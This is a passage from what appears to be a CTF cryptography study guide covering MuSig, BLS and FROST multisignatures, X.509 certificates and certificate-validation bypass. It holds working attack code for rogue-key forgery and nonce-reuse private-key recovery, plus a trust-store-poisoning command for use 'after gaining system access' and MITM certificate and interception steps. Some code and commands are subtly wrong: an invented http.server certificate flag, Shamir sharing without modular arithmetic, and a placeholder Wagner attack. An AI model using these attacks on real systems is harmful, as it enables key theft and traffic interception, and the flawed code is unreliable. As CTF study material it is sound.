        Aggregate public keys with coefficients
        Returns: (aggregated_key, coefficients)
        """
        ## Compute L = H(X_1 || X_2 || ... || X_n)
        L_input = b''.join([
            pk.x.to_bytes(32, 'big') + pk.y.to_bytes(32, 'big')
            for pk in public_keys
        ])
        L = sha256(L_input).digest()
        
        ## Compute coefficients a_i = H(L || X_i)
        coefficients = []
        for pk in public_keys:
            a_i_input = L + pk.x.to_bytes(32, 'big') + pk.y.to_bytes(32, 'big')
            a_i = int.from_bytes(sha256(a_i_input).digest(), 'big') % self.n
            coefficients.append(a_i)
        
        ## Compute X_agg = sum(a_i * X_i)
        X_agg = None
        for a_i, pk in zip(coefficients, public_keys):
            term = self.point_mul(a_i, pk)
            if X_agg is None:
                X_agg = term
            else:
                X_agg = self.point_add(X_agg, term)
        
        return X_agg, coefficients
    
    def commit_nonce(self, r: int) -> Tuple[bytes, Point]:
        """
        Signer commits to nonce
        Returns: (commitment, R_i)
        """
        R_i = self.point_mul(r, self.G)
        commitment = sha256(
            R_i.x.to_bytes(32, 'big') + R_i.y.to_bytes(32, 'big')
        ).digest()
        return commitment, R_i
    
    def sign_partial(self, message: bytes, private_key: int, 
                     nonce: int, R_agg: Point, X_agg: Point, 
                     coefficient: int) -> int:
        """
        Create partial signature
        s_i = r_i + c * a_i * x_i
        """
        ## Compute challenge c = H(X_agg || R_agg || m)
        c_input = (
            X_agg.x.to_bytes(32, 'big') + X_agg.y.to_bytes(32, 'big') +
            R_agg.x.to_bytes(32, 'big') + R_agg.y.to_bytes(32, 'big') +
            message
        )
        c = int.from_bytes(sha256(c_input).digest(), 'big') % self.n
        
        ## s_i = r_i + c * a_i * x_i
        s_i = (nonce + c * coefficient * private_key) % self.n
        
        return s_i
    
    def aggregate_signatures(self, partial_sigs: List[int]) -> int:
        """Aggregate partial signatures"""
        return sum(partial_sigs) % self.n
    
    def verify(self, message: bytes, X_agg: Point, 
               R_agg: Point, s_agg: int) -> bool:
        """
        Verify aggregate signature
        Check: s_agg * G = R_agg + c * X_agg
        """
        ## Compute challenge
        c_input = (
            X_agg.x.to_bytes(32, 'big') + X_agg.y.to_bytes(32, 'big') +
            R_agg.x.to_bytes(32, 'big') + R_agg.y.to_bytes(32, 'big') +
            message
        )
        c = int.from_bytes(sha256(c_input).digest(), 'big') % self.n
        
        ## Left side: s_agg * G
        lhs = self.point_mul(s_agg, self.G)
        
        ## Right side: R_agg + c * X_agg
        c_X_agg = self.point_mul(c, X_agg)
        rhs = self.point_add(R_agg, c_X_agg)
        
        return lhs.x == rhs.x and lhs.y == rhs.y

## Example usage
def musig_example():
    """Complete MuSig signing example"""
    ## Simplified curve parameters (use real secp256k1 in practice)
    p = 2**256 - 2**32 - 977
    n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
    G = Point(
        0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798,
        0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8
    )
    
    musig = MuSig(p, 0, 7, G, n)
    
    ## Three signers generate keypairs
    private_keys = [0x1234, 0x5678, 0x9ABC]
    public_keys = [musig.point_mul(sk, G) for sk in private_keys]
    
    ## Key aggregation
    X_agg, coefficients = musig.aggregate_keys(public_keys)
    print(f"Aggregated public key: ({hex(X_agg.x)[:16]}..., {hex(X_agg.y)[:16]}...)")
    
    ## Each signer generates nonce and commitment
    nonces = [0xDEAD, 0xBEEF, 0xCAFE]
    commitments = []
    R_values = []
    for r in nonces:
        commit, R_i = musig.commit_nonce(r)
        commitments.append(commit)
        R_values.append(R_i)
    
    ## Aggregate nonces
    R_agg = R_values[0]
    for R_i in R_values[1:]:
        R_agg = musig.point_add(R_agg, R_i)
    
    ## Each signer creates partial signature
    message = b"CTF{multisig_example}"
    partial_sigs = []
    for sk, r, coeff in zip(private_keys, nonces, coefficients):
        s_i = musig.sign_partial(message, sk, r, R_agg, X_agg, coeff)
        partial_sigs.append(s_i)
    
    ## Aggregate signatures
    s_agg = musig.aggregate_signatures(partial_sigs)
    
    ## Verify
    valid = musig.verify(message, X_agg, R_agg, s_agg)
    print(f"Signature valid: {valid}")
    
    return X_agg, R_agg, s_agg

```

#### CTF Attack Vectors

**1. Rogue Key Attack**

If key aggregation doesn't use coefficients, attacker can create rogue key:

```python
def rogue_key_attack(honest_pubkeys: List[Point], musig: MuSig, 
                     attacker_private: int) -> Point:
    """
    Vulnerable aggregation: X_agg = sum(X_i) without coefficients
    Attacker chooses: X_attacker = X_attacker' - sum(X_honest)
    Then: X_agg = X_attacker' (attacker has full control)
    """
    ## Sum honest public keys
    X_honest_sum = honest_pubkeys[0]
    for pk in honest_pubkeys[1:]:
        X_honest_sum = musig.point_add(X_honest_sum, pk)
    
    ## Attacker's real key
    X_attacker_real = musig.point_mul(attacker_private, musig.G)
    
    ## Compute rogue key: X_rogue = X_attacker_real - X_honest_sum
    ## (Subtract by adding negation)
    X_honest_sum_neg = Point(X_honest_sum.x, musig.p - X_honest_sum.y)
    X_rogue = musig.point_add(X_attacker_real, X_honest_sum_neg)
    
    print(f"[Attack] Rogue key: ({hex(X_rogue.x)[:16]}..., {hex(X_rogue.y)[:16]}...)")
    print(f"[Attack] Attacker can now sign alone using private key {hex(attacker_private)}")
    
    return X_rogue

## Example: Exploiting vulnerable aggregation
def exploit_no_coefficient_aggregation():
    """
    [Inference] If implementation aggregates as X_agg = X_1 + X_2 + ... + X_n
    without coefficients, rogue key attack succeeds
    """
    ## Attacker knows honest pubkeys
    honest_keys = [...]  ## From protocol execution
    
    ## Attacker generates rogue key
    attacker_sk = 0xDEADBEEF
    rogue_pk = rogue_key_attack(honest_keys, musig, attacker_sk)
    
    ## Attacker submits rogue_pk
    ## Now X_agg = attacker's chosen key
    ## Attacker can create valid signatures alone
```

**2. Nonce Reuse Attack**

If signer reuses nonce across different messages:

```python
def nonce_reuse_multisig_attack(msg1: bytes, s1_partial: int, 
                                 msg2: bytes, s2_partial: int,
                                 R_agg: Point, X_agg: Point, 
                                 coefficient: int, n: int) -> int:
    """
    Two partial signatures from same signer with same nonce:
    s1 = r + c1 * a * x
    s2 = r + c2 * a * x
    
    Solve for private key x
    """
    ## Compute challenges
    c1_input = (
        X_agg.x.to_bytes(32, 'big') + X_agg.y.to_bytes(32, 'big') +
        R_agg.x.to_bytes(32, 'big') + R_agg.y.to_bytes(32, 'big') +
        msg1
    )
    c1 = int.from_bytes(sha256(c1_input).digest(), 'big') % n
    
    c2_input = (
        X_agg.x.to_bytes(32, 'big') + X_agg.y.to_bytes(32, 'big') +
        R_agg.x.to_bytes(32, 'big') + R_agg.y.to_bytes(32, 'big') +
        msg2
    )
    c2 = int.from_bytes(sha256(c2_input).digest(), 'big') % n
    
    ## s1 - s2 = (c1 - c2) * a * x
    ## x = (s1 - s2) / ((c1 - c2) * a) mod n
    
    if c1 == c2:
        print("[!] Same challenge, cannot recover key")
        return None
    
    numerator = (s1_partial - s2_partial) % n
    denominator = ((c1 - c2) * coefficient) % n
    
    if denominator == 0:
        print("[!] Cannot recover key (denominator is 0)")
        return None
    
    private_key = (numerator * pow(denominator, -1, n)) % n
    print(f"[!] Recovered private key: {hex(private_key)}")
    
    return private_key
```

**3. Wagner's Attack (Parallel Signing Sessions)**

[Inference] If protocol allows multiple concurrent signing sessions, attacker may exploit generalized birthday paradox:

```python
def wagners_attack_setup(target_challenge: int, n_sessions: int, n: int):
    """
    [Inference] Wagner's generalized birthday attack on multisig
    
    Attacker initiates many parallel signing sessions and selects
    nonces such that challenges sum to desired value
    
    Requires: ~2^(t/(t+1)) operations for t-sum problem
    """
    ## Attacker chooses many nonces R_i
    ## Computes challenges c_i = H(X_agg || R_i || m_i)
    ## Finds subset where sum(c_i) equals target
    
    ## Simplified demonstration (real attack needs generalized birthday algorithm)
    import random
    
    challenges = []
    nonces = []
    
    for _ in range(n_sessions):
        r = random.randint(1, n - 1)
        nonces.append(r)
        ## Compute challenge (simplified)
        c = random.randint(0, n - 1)
        challenges.append(c)
    
    ## Try to find subset summing to target (brute force demo)
    ## Real attack uses sophisticated algorithm
    print(f"[Attack] Generated {n_sessions} sessions")
    print(f"[Attack] Attempting to find subset summing to target...")
    
    ## In real Wagner's attack, use k-sum tree algorithm
    return challenges, nonces

def prevent_wagners_attack():
    """
    Mitigation: Use deterministic nonce generation or
    limit concurrent sessions
    """
    print("Mitigation 1: Deterministic nonces (like EdDSA)")
    print("Mitigation 2: Sequential signing (no parallel sessions)")
    print("Mitigation 3: Commitment to message before nonce revelation")
```

**4. Malicious Commitment Attack**

If nonce commitment phase is skipped or improperly implemented:

```python
def commitment_bypass_attack(honest_R_values: List[Point], 
                            message: bytes, musig: MuSig,
                            attacker_private: int, coefficient: int):
    """
    [Inference] If attacker sees honest signers' R values before committing,
    can choose R to create desired challenge
    """
    ## Honest signers reveal R_1, R_2, ...
    R_honest_agg = honest_R_values[0]
    for R in honest_R_values[1:]:
        R_honest_agg = musig.point_add(R_honest_agg, R)
    
    ## Attacker chooses malicious R to manipulate challenge
    ## Example: force specific challenge value
    
    target_challenge = 0  ## Forces s_i = r_i (leaks nonce)
    
    ## Attacker computes R_attacker such that:
    ## H(X_agg || (R_honest_agg + R_attacker) || m) = target_challenge
    
    ## [Unverified] This requires preimage attack on hash function
    ## But demonstrates why commitment phase is critical
    
    print("[Attack] Without commitment, attacker can manipulate R_agg")
    print("[Attack] Proper protocol: commit to R_i before seeing others")
```

**5. Partial Signature Forgery**

```python
def forge_partial_signature(message: bytes, R_agg: Point, 
                           X_agg: Point, known_partials: List[int],
                           n_signers: int, musig: MuSig):
    """
    [Inference] If attacker controls enough signers or learns partial signatures,
    may forge missing partial signature
    
    s_agg = sum(s_i)
    If attacker knows s_agg (from valid signature) and all but one s_i,
    can compute missing s_i = s_agg - sum(known s_i)
    """
    ## Example: 3-of-3 multisig, attacker gets 2 partial sigs and final sig
    s_agg = 0x123456  ## Obtained somehow
    
    missing_s_i = s_agg
    for s in known_partials:
        missing_s_i = (missing_s_i - s) % musig.n
    
    print(f"[Attack] Forged missing partial: {hex(missing_s_i)}")
    print("[Note] This reveals information about missing signer's key")
    
    return missing_s_i
```

#### BLS Multisignatures

BLS (Boneh-Lynn-Shacham) signatures support non-interactive aggregation using pairing-based cryptography.

**Properties:**
- Non-interactive aggregation
- Signature size constant regardless of signers
- Requires pairing-friendly curves (BLS12-381)

```python
## Note: Real BLS requires pairing operations
## This is a simplified demonstration structure

class BLSMultisig:
    """
    [Unverified] Simplified BLS structure for educational purposes
    Real implementation requires pairing-friendly curve library
    """
    
    def __init__(self):
        ## Would use BLS12-381 curve
        ## G1: signature group
        ## G2: public key group
        ## GT: target group for pairing
        pass
    
    def sign(self, private_key: int, message: bytes):
        """
        Individual signature: σ = H(m)^sk
        where H: {0,1}* -> G1
        """
        ## Hash to curve point in G1
        ## h = hash_to_curve(message)
        ## signature = h * private_key
        pass
    
    def aggregate_signatures(self, signatures: List):
        """
        Aggregate: σ_agg = σ_1 + σ_2 + ... + σ_n
        Simple point addition in G1
        """
        ## sig_agg = sum(signatures)
        pass
    
    def aggregate_verify(self, public_keys: List, message: bytes, 
                        signature):
        """
        Verify: e(σ_agg, G) = e(H(m), PK_1 + PK_2 + ... + PK_n)
        where e is pairing function
        """
        ## pk_agg = sum(public_keys)
        ## return pairing(signature, G) == pairing(hash_to_curve(message), pk_agg)
        pass

## Attack: Rogue public key (if no key validation)
def bls_rogue_key_attack():
    """
    [Inference] Similar to MuSig rogue key attack
    Attacker chooses: PK_attacker = PK_attacker' - sum(PK_honest)
    Then can sign alone
    
    Mitigation: Proof of possession (PoP) for each public key
    """
    print("BLS rogue key mitigation: Require proof of possession")
    print("Each signer proves knowledge of private key via:")
    print("PoP = H(PK)^sk")
```

#### Practical Tools & Commands

**Using Bitcoin multisig (P2SH):**

```bash
#!/bin/bash
## Bitcoin multisig example (2-of-3)

## Generate 3 keypairs
bitcoin-cli getnewaddress "" "legacy" > addr1.txt
bitcoin-cli getnewaddress "" "legacy" > addr2.txt
bitcoin-cli getnewaddress "" "legacy" > addr3.txt

## Get public keys
PUBKEY1=$(bitcoin-cli getaddressinfo $(cat addr1.txt) | jq -r '.pubkey')
PUBKEY2=$(bitcoin-cli getaddressinfo $(cat addr2.txt) | jq -r '.pubkey')
PUBKEY3=$(bitcoin-cli getaddressinfo $(cat addr3.txt) | jq -r '.pubkey')

## Create 2-of-3 multisig address
bitcoin-cli createmultisig 2 "[\"$PUBKEY1\",\"$PUBKEY2\",\"$PUBKEY3\"]"

## Sign transaction (requires 2 signatures)
## TX_HEX=$(bitcoin-cli createrawtransaction ...)
## SIG1=$(bitcoin-cli signrawtransactionwithkey $TX_HEX [key1])
## SIG2=$(bitcoin-cli signrawtransactionwithkey $TX_HEX [key2])
## bitcoin-cli sendrawtransaction $FINAL_TX
```

**Testing MuSig implementation vulnerabilities:**

```python
#!/usr/bin/env python3
## test_musig_vulns.py

def test_coefficient_omission(musig_impl):
    """Test if implementation omits key aggregation coefficients"""
    from random import randint
    
    ## Create honest keypairs
    honest_keys = [
        (randint(1, musig_impl.n - 1), None) 
        for _ in range(2)
    ]
    honest_pubkeys = [
        musig_impl.point_mul(sk, musig_impl.G) 
        for sk, _ in honest_keys
    ]
    
    ## Try rogue key attack
    attacker_sk = randint(1, musig_impl.n - 1)
    attacker_target = musig_impl.point_mul(attacker_sk, musig_impl.G)
    
    ## Compute rogue key
    honest_sum = honest_pubkeys[0]
    for pk in honest_pubkeys[1:]:
        honest_sum = musig_impl.point_add(honest_sum, pk)
    
    honest_sum_neg = Point(honest_sum.x, musig_impl.p - honest_sum.y)
    rogue_pk = musig_impl.point_add(attacker_target, honest_sum_neg)
    
    ## Aggregate
    all_keys = honest_pubkeys + [rogue_pk]
    agg_key, _ = musig_impl.aggregate_keys(all_keys)
    
    ## Check if aggregated key equals attacker's target
    if agg_key.x == attacker_target.x and agg_key.y == attacker_target.y:
        print("[VULN] Rogue key attack successful!")
        print("[VULN] Implementation does not use proper coefficients")
        return True
    else:
        print("[OK] Rogue key attack failed (proper coefficients used)")
        return False

def test_commitment_enforcement(musig_protocol):
    """Test if protocol enforces commitment phase"""
    ## [Inference] Try to submit R value after seeing other signers' R values
    ## If accepted, commitment phase is not enforced
    pass

def test_nonce_reuse_detection(musig_impl):
    """Test if implementation detects/prevents nonce reuse"""
    ## Sign same message twice with monitoring for same R value
    pass
```

**Extracting multisig information from blockchain:**

```bash
#!/bin/bash
## Extract Bitcoin multisig details

## Decode P2SH multisig redeem script
bitcoin-cli decodescript "REDEEM_SCRIPT_HEX" | jq

## Example output shows:
## - Required signatures (m)
## - Total signers (n)
## - Public keys

## Check if address is multisig
bitcoin-cli getaddressinfo "ADDRESS" | jq '.isscript, .script, .sigsrequired'
```

#### Threshold Signatures (t-of-n)

**FROST (Flexible Round-Optimized Schnorr Threshold):**

```python
class FROSTThreshold:
    """
    [Unverified] Simplified FROST threshold signature structure
    Real implementation requires complex secret sharing
    """
    
    def __init__(self, threshold: int, total_signers: int):
        self.t = threshold  ## Minimum required signatures
        self.n = total_signers  ## Total participants
    
    def dealer_distribute_shares(self, secret: int, n: int):
        """
        Dealer creates secret shares using Shamir's scheme
        f(x) = a_0 + a_1*x + ... + a_{t-1}*x^{t-1}
        where a_0 = secret
        """
        import random
        
        ## Generate random polynomial coefficients
        coefficients = [secret] + [
            random.randint(1, self.n - 1) 
            for _ in range(self.t - 1)
        ]
        
        ## Evaluate polynomial at points 1, 2, ..., n
        shares = []
        for i in range(1, n + 1):
            share = sum(
                coeff * (i ** j) 
                for j, coeff in enumerate(coefficients)
            )
            shares.append((i, share))
        
        return shares
    
    def lagrange_coefficient(self, i: int, participants: List[int], 
                            modulus: int) -> int:
        """
        Compute Lagrange coefficient λ_i for participant i
        λ_i = ∏(j/(j-i)) for j in participants, j ≠ i
        """
        numerator = 1
        denominator = 1
        
        for j in participants:
            if j != i:
                numerator = (numerator * j) % modulus
                denominator = (denominator * (j - i)) % modulus
        
        return (numerator * pow(denominator, -1, modulus)) % modulus
    
    def combine_signatures(self, partial_sigs: List[Tuple[int, int]], 
                          modulus: int) -> int:
        """
        Combine t partial signatures using Lagrange interpolation
        s = ∑(λ_i * s_i)
        """
        participants = [i for i, _ in partial_sigs]
        
        combined = 0
        for i, s_i in partial_sigs:
            lambda_i = self.lagrange_coefficient(i, participants, modulus)
            combined = (combined + lambda_i * s_i) % modulus
        
        return combined
```

#### Advanced CTF Patterns

**Pattern 1: Threshold Bypass via Share Leakage**

```python
def recover_secret_from_shares(shares: List[Tuple[int, int]], 
                               threshold: int, prime: int) -> int:
    """
    If attacker obtains t shares, can reconstruct secret
    """
    if len(shares) < threshold:
        print(f"[!] Need {threshold} shares, only have {len(shares)}")
        return None
    
    ## Use Lagrange interpolation at x=0
    secret = 0
    participants = [x for x, _ in shares[:threshold]]
    
    for i, (x_i, y_i) in enumerate(shares[:threshold]):
        ## Compute Lagrange basis polynomial at x=0
        basis = 1
        for x_j in participants:
            if x_j != x_i:
                basis = (basis * (-x_j)) % prime
                basis = (basis * pow(x_j - x_i, -1, prime)) % prime
        
        secret = (secret + y_i * basis) % prime
    
    print(f"[!] Recovered secret: {hex(secret)}")
    return secret
```

**Pattern 2: Malicious Dealer Attack**

```python
def detect_malicious_dealer(shares: List[Tuple[int, int]], 
                           public_commitments: List):
    """
    [Inference] Verify dealer provided consistent shares
    Check: g^{f(i)} = ∏(C_j^{i^j}) for each participant i
    """
    ## Each participant can verify their share against public commitments
    ## If verification fails, dealer is malicious
    pass
```

---

### Key Recommendations

For comprehensive CTF preparation in digital signature schemes, prioritize:

1. **EdDSA-specific tools**: Practice with libsodium, OpenSSL 1.1.1+, and Python cryptography library
2. **Blind signature implementations**: Study RSA multiplicative properties and implement attacks on weak blinding
3. **MuSig/multisig protocols**: Understand rogue key attacks, nonce management, and Wagner's attack conditions
4. **Pairing-based cryptography**: BLS signatures require specialized libraries (py_ecc, blst)
5. **Threshold cryptography**: Shamir secret sharing and Lagrange interpolation for recovery attacks

Related topics for deeper study: Schnorr signatures, ECDSA biased nonce attacks, aggregate signature schemes (BLS, BGLS), verifiable secret sharing, and distributed key generation protocols.

---

## PKI (Public Key Infrastructure)

PKI is the framework enabling secure communications through asymmetric cryptography, digital certificates, and trusted third parties. In CTF contexts, PKI vulnerabilities often involve certificate validation failures, chain-of-trust issues, and cryptographic weaknesses in certificate generation or verification.

### X.509 Certificates

X.509 is the ITU-T standard defining the format of public key certificates. These certificates bind public keys to identities through digital signatures from Certificate Authorities.

#### Certificate Structure

X.509 certificates contain:
- **Version**: X.509 version (v1, v2, v3)
- **Serial Number**: Unique identifier from issuing CA
- **Signature Algorithm**: Algorithm used by CA to sign (e.g., sha256WithRSAEncryption)
- **Issuer**: Distinguished Name (DN) of signing CA
- **Validity Period**: notBefore and notAfter timestamps
- **Subject**: DN of certificate owner
- **Subject Public Key Info**: Public key and algorithm
- **Extensions** (v3 only): Additional attributes like Key Usage, Subject Alternative Names

#### Examining Certificates with OpenSSL

```bash
## Display certificate in human-readable format
openssl x509 -in certificate.crt -text -noout

## Show specific fields
openssl x509 -in certificate.crt -noout -subject -issuer -dates

## Display certificate fingerprint
openssl x509 -in certificate.crt -noout -fingerprint -sha256

## Extract public key
openssl x509 -in certificate.crt -noout -pubkey

## Convert certificate formats
openssl x509 -in certificate.pem -outform DER -out certificate.der
openssl x509 -in certificate.der -inform DER -outform PEM -out certificate.pem
```

#### Parsing Certificates Programmatically

Python with cryptography library:
```python
from cryptography import x509
from cryptography.hazmat.backends import default_backend

## Load certificate
with open('certificate.crt', 'rb') as f:
    cert_data = f.read()
    cert = x509.load_pem_x509_certificate(cert_data, default_backend())

## Extract information
print(f"Subject: {cert.subject}")
print(f"Issuer: {cert.issuer}")
print(f"Serial: {cert.serial_number}")
print(f"Not Valid Before: {cert.not_valid_before}")
print(f"Not Valid After: {cert.not_valid_after}")

## Access extensions
for ext in cert.extensions:
    print(f"{ext.oid._name}: {ext.value}")
```

#### Common CTF Certificate Vulnerabilities

**Weak Key Sizes**: Certificates with RSA keys below 2048 bits are vulnerable to factorization attacks
```bash
## Check key size
openssl x509 -in certificate.crt -text -noout | grep "Public-Key"
```

**Expired Certificates**: Applications failing to validate expiration
```bash
## Check validity dates
openssl x509 -in certificate.crt -noout -checkend 0
```

**Incorrect Hostname Verification**: Subject Alternative Name (SAN) or Common Name (CN) mismatch
```bash
## Extract SANs
openssl x509 -in certificate.crt -text -noout | grep -A1 "Subject Alternative Name"
```

### Certificate Chains

Certificate chains establish trust from an end-entity certificate back to a trusted root CA through intermediate certificates.

#### Chain Structure

```
Root CA (self-signed, in trust store)
    ↓
Intermediate CA (signed by Root)
    ↓
Intermediate CA (signed by previous Intermediate) [optional, multiple levels]
    ↓
End-Entity Certificate (signed by Intermediate)
```

#### Verifying Certificate Chains

```bash
## Verify certificate against CA bundle
openssl verify -CAfile ca-bundle.crt certificate.crt

## Verify with intermediate chain
openssl verify -CAfile root-ca.crt -untrusted intermediate.crt certificate.crt

## Show full chain from server
openssl s_client -connect example.com:443 -showcerts

## Extract individual certificates from chain
openssl s_client -connect example.com:443 -showcerts 2>/dev/null | \
    awk '/BEGIN CERT/,/END CERT/ {print}'
```

#### Building Certificate Chains

```bash
## Concatenate chain manually (order matters: end-entity → intermediate → root)
cat end-entity.crt intermediate.crt root.crt > full-chain.crt

## Verify constructed chain
openssl verify -CAfile root.crt -untrusted intermediate.crt end-entity.crt
```

#### Chain Validation Process

[Inference based on PKI standards]: During validation, systems typically:
1. Check certificate signature using issuer's public key
2. Verify issuer certificate recursively up the chain
3. Confirm root certificate exists in trust store
4. Validate expiration dates for all certificates
5. Check revocation status (CRL/OCSP if configured)

#### CTF Chain Exploitation Vectors

**Missing Intermediate Certificates**: Server presents incomplete chain
```bash
## Test if server sends full chain
echo | openssl s_client -connect target:443 2>/dev/null | \
    grep -c "BEGIN CERTIFICATE"
```

**Chain Substitution Attacks**: Replace intermediate with attacker-controlled CA if validation is weak

**Path Building Vulnerabilities**: Multiple valid paths to different roots may enable trust manipulation

### Root Certificate Authorities

Root CAs are self-signed certificates at the top of the PKI hierarchy. Trust in a root CA is established by including it in the operating system or application trust store.

#### Locating System Trust Stores

**Linux**:
```bash
## Debian/Ubuntu location
ls /etc/ssl/certs/

## System-wide CA bundle
cat /etc/ssl/certs/ca-certificates.crt

## Update trust store
sudo update-ca-certificates
```

**Windows**:
```powershell
## View trusted root CAs
certutil -store -enterprise root

## Export root store
certutil -store root > root_certs.txt
```

**Firefox** (maintains separate trust store):
```bash
## Profile location
~/.mozilla/firefox/*.default-release/cert9.db
```

#### Examining Root Certificates

```bash
## List system root CAs (Debian/Ubuntu)
awk -v cmd='openssl x509 -noout -subject' '/BEGIN/{close(cmd)};{print | cmd}' \
    /etc/ssl/certs/ca-certificates.crt

## Extract specific root certificate
openssl x509 -in /etc/ssl/certs/ca-certificates.crt -text -noout

## Check if certificate is self-signed (subject == issuer)
openssl x509 -in root.crt -noout -subject -issuer
```

#### Root CA Characteristics

- **Self-signed**: Subject and Issuer fields are identical
- **Basic Constraints**: CA:TRUE, no pathlen constraint
- **Key Usage**: Certificate Sign, CRL Sign
- **Long Validity**: Often 20-30 years

#### Adding Custom Root CAs

**Linux (Debian/Ubuntu)**:
```bash
## Copy certificate to trusted directory
sudo cp custom-root.crt /usr/local/share/ca-certificates/

## Update trust store
sudo update-ca-certificates

## Verify addition
grep "custom-root" /etc/ssl/certs/ca-certificates.crt
```

**Linux (CentOS/RHEL)**:
```bash
sudo cp custom-root.crt /etc/pki/ca-trust/source/anchors/
sudo update-ca-trust
```

**Temporary per-command**:
```bash
## Set for single OpenSSL operation
openssl s_client -connect target:443 -CAfile custom-root.crt

## Set for curl
curl --cacert custom-root.crt https://target
```

#### CTF Root CA Attack Scenarios

**Trust Store Poisoning**: Adding malicious root CA enables MITM attacks on all TLS connections
```bash
## Example: After gaining system access, inject rogue CA
sudo cp attacker-root.crt /usr/local/share/ca-certificates/
sudo update-ca-certificates
```

**Root CA Key Compromise**: If root private key is exposed, attacker can sign arbitrary certificates trusted by all systems

**Trust Store Enumeration**: Identifying outdated or revoked roots still in trust store

### Self-signed Certificates

Self-signed certificates are signed by the same entity whose identity they certify, bypassing the CA hierarchy.

#### Creating Self-signed Certificates

**Basic self-signed certificate**:
```bash
## Generate private key and self-signed certificate in one command
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes \
    -subj "/C=US/ST=State/L=City/O=Organization/CN=example.com"

## Separate key generation and certificate creation
openssl genrsa -out private.key 4096
openssl req -new -x509 -key private.key -out certificate.crt -days 365 \
    -subj "/CN=example.com"
```

**Self-signed with Subject Alternative Names**:
```bash
## Create config file for SANs
cat > san.cnf <<EOF
[req]
distinguished_name = req_distinguished_name
x509_extensions = v3_req
prompt = no

[req_distinguished_name]
CN = example.com

[v3_req]
keyUsage = keyEncipherment, dataEncipherment
extendedKeyUsage = serverAuth
subjectAltName = @alt_names

[alt_names]
DNS.1 = example.com
DNS.2 = www.example.com
IP.1 = 192.168.1.100
EOF

## Generate with config
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes \
    -config san.cnf
```

#### Examining Self-signed Certificates

```bash
## Verify certificate is self-signed
openssl x509 -in cert.pem -noout -subject -issuer
## Subject and Issuer will be identical

## Check signature verifies with own public key
openssl verify -CAfile cert.pem cert.pem
```

#### Using Self-signed Certificates

**Testing with web server**:
```bash
## Python HTTPS server with self-signed cert
python3 -m http.server 443 --bind 0.0.0.0 \
    --certificate cert.pem --key key.pem

## OpenSSL s_server for testing
openssl s_server -accept 4433 -cert cert.pem -key key.pem -www
```

**Client connections**:
```bash
## Connect accepting self-signed certificates
curl --insecure https://target

## OpenSSL s_client
openssl s_client -connect target:443

## wget
wget --no-check-certificate https://target
```

#### CTF Self-signed Certificate Scenarios

**Applications Accepting Any Certificate**: Web applications or APIs that disable certificate validation entirely
```python
## Common Python vulnerability pattern
import requests
response = requests.get('https://target', verify=False)  ## Dangerous
```

**Certificate Pinning Bypass**: Self-signed certificates used in mobile app pinning can often be extracted from APK/IPA files
```bash
## Extract certificates from APK
unzip app.apk -d app_extracted
find app_extracted -name "*.crt" -o -name "*.pem"
```

**MITM with Self-signed Certificates**: In penetration testing scenarios, intercepting traffic requires target accepting attacker's self-signed certificate
```bash
## Generate MITM certificate matching target domain
openssl req -x509 -newkey rsa:2048 -keyout mitm.key -out mitm.crt -days 365 -nodes \
    -subj "/CN=target.com"
```

**Private Key Extraction**: Self-signed certificates deployed with embedded private keys
```bash
## Check if PEM file contains both certificate and private key
grep -c "BEGIN" combined.pem
openssl rsa -in combined.pem -check  ## Extracts private key if present
```

#### Self-signed vs CA-signed Trade-offs

**Self-signed Advantages** (CTF context):
- No dependency on external CA
- Complete control over certificate contents
- Useful for testing/development environments
- Faster to generate

**Self-signed Disadvantages**:
- Not trusted by default in browsers/systems
- No third-party validation of identity
- Users must manually add to trust store
- Often indicates development/testing environment in CTF

---

### Key Tools Summary

**OpenSSL**: Primary tool for certificate manipulation
- `x509`: Certificate operations
- `verify`: Chain validation
- `s_client`: TLS client testing
- `s_server`: TLS server testing
- `req`: Certificate request and generation

**Python cryptography library**: Programmatic certificate parsing and validation

**certutil** (Windows): Certificate store management

**System-specific**: `update-ca-certificates` (Debian/Ubuntu), `update-ca-trust` (RHEL/CentOS)

### Related Topics for Further Study

- Certificate Revocation (CRL, OCSP)
- Certificate Transparency Logs
- PKCS standards (PKCS#7, PKCS#12)
- TLS/SSL Protocol Implementation
- Certificate Pinning Mechanisms

---

## Certificate Attacks

### Signature Verification Bypass

Certificate signature verification bypass exploits occur when applications fail to properly validate the cryptographic signature chain in X.509 certificates. This allows attackers to present invalid or malicious certificates that improperly validated systems accept as legitimate.

**Core Vulnerability Mechanisms:**

Applications may fail verification through improper implementation of certificate chain validation, missing checks for certificate authority (CA) signatures, or incorrect handling of intermediate certificates. The vulnerability typically manifests in custom TLS/SSL implementations, mobile applications, or legacy systems with outdated cryptographic libraries.

**OpenSSL Verification Testing:**

```bash
# Verify certificate against CA
openssl verify -CAfile ca.crt target.crt

# Verify entire certificate chain
openssl verify -CAfile ca.crt -untrusted intermediate.crt target.crt

# Display certificate details for manual inspection
openssl x509 -in certificate.crt -text -noout

# Check signature algorithm
openssl x509 -in certificate.crt -text -noout | grep "Signature Algorithm"
```

**Testing for Bypass Vulnerabilities:**

```bash
# Create self-signed certificate without proper CA
openssl req -x509 -newkey rsa:2048 -keyout fake.key -out fake.crt -days 365 -nodes

# Test if application accepts invalid certificate
curl --cacert fake.crt https://target.com

# Use --insecure to bypass verification (testing only)
curl -k https://target.com -v
```

**Mitmproxy for Certificate Interception:**

```bash
# Install mitmproxy
apt-get install mitmproxy

# Run proxy on port 8080
mitmproxy -p 8080

# Use with custom certificate
mitmproxy --certs /path/to/cert.pem

# Transparent mode for HTTPS interception
mitmproxy --mode transparent --showhost
```

**Python Implementation Testing:**

Create a test script to validate whether an application properly checks signatures:

```python
from cryptography import x509
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding

# Load certificates
with open('cert.pem', 'rb') as f:
    cert = x509.load_pem_x509_certificate(f.read(), default_backend())

with open('ca.pem', 'rb') as f:
    ca_cert = x509.load_pem_x509_certificate(f.read(), default_backend())

# Manual signature verification
ca_public_key = ca_cert.public_key()
try:
    ca_public_key.verify(
        cert.signature,
        cert.tbs_certificate_bytes,
        padding.PKCS1v15(),
        cert.signature_hash_algorithm
    )
    print("Signature valid")
